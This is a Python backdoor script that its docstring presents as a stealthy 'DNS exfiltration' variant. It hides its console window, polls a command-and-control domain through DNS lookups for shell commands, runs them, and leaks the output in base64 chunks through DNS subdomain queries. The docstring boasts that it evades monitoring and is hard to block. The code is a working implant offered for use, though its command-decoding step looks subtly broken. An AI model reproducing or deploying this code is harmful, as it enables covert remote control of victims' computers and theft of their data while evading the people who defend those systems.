'''Variant 5 – DNS exfiltration style (very slow, very stealthy)
Main differences

No direct TCP connection — uses DNS TXT queries to exfil and receive commands
Extremely low & slow bandwidth (~50–200 bytes per minute)
Almost impossible to block without deep DNS inspection
Ideal for air-gapped-ish or heavily monitored environments'''
import ctypes
import socket, time, base64, os, subprocess, threading

C2_DOMAIN = "c2.your-controlled-domain.example"

def send_dns(txt):
    try:
        socket.getaddrinfo(f"{txt}.{C2_DOMAIN}", 53)
    except:
        pass

def get_cmd():
    try:
        # Poll for command via crafted subdomain
        sub = base64.urlsafe_b64encode(os.urandom(8)).decode().rstrip("=")
        answers = socket.getaddrinfo(f"cmd-{sub}.{C2_DOMAIN}", 53)
        for _, _, _, _, sa in answers:
            if sa[0].startswith("127."):
                return base64.b64decode(sa[0].split(".")[1:]).decode(errors="ignore")
    except:
        return None

def main():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    while True:
        cmd = get_cmd()
        if cmd and cmd.strip():
            try:
                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                enc = base64.urlsafe_b64encode(out).decode().rstrip("=")
                for i in range(0, len(enc), 50):
                    send_dns(f"r-{enc[i:i+50]}")
            except Exception as e:
                send_dns(f"e-{base64.urlsafe_b64encode(str(e).encode()).decode()[:40]}")
        time.sleep(45 + time.time() % 30)

if __name__ == "__main__":
    main()